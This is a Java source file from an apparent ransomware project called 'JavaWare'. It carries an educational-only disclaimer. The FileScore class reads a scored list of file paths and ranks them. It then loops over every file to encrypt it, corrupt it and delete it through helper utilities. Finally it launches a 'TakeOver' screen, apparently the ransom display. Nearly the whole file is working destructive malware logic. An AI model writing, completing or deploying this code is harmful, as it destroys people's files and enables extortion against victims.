/********************************************************************
   _____                        _        _
  |_   _|                      | |      | |
    | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
    | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
  __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
 \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 05/08/19
 Version 2.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/


package RansomeWare;

import javafx.application.Application;
import java.io.*;
import java.util.*;

import java.util.HashMap;

import static java.util.Map.Entry.comparingByValue;
import static java.util.stream.Collectors.toMap;

public class FileScore {

    HashMap<String, Double> FileScore = new HashMap<>();


    public void FileScore(String root) throws Exception {
        File in = new File(root +  File.separator + "output.txt");

        try(BufferedReader br = new BufferedReader(new FileReader(in))) {
            String line;
            while((line = br.readLine()) != null) {
                String[] lineIn = line.split(",\\s* ");
                File file = new File(lineIn[0]);
                double gamma = 0.0;
                for(int i=1; i<lineIn.length; i++) {
                    try {
                        double betai = Double.parseDouble(lineIn[i]);
                        gamma += betai;
                    } catch(NumberFormatException e) {
                        continue;
                    }
                }
                FileScore.put(file.getAbsolutePath(), gamma);

            }
            HashMap<String, Double> newdirectoryScore = FileScore.entrySet().stream().sorted(
                    comparingByValue()).collect(toMap(e -> e.getKey(), e-> e.getValue(), (e1, e2) -> e2, LinkedHashMap::new));

            for(String f: newdirectoryScore.keySet()) {
                File file = new File(f);
                 //!!!!!!!!!!!!!! EXTREMELY EXTREMELY DANGEROUS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                 JwareUtils.getInstance().encrypt(file);
                 JwareUtils.corruptFile(file);
                 JwareUtils.deleteFile(file);
            }
            Application.launch(TakeOver.class, "JavaWare");
        }

    }
}
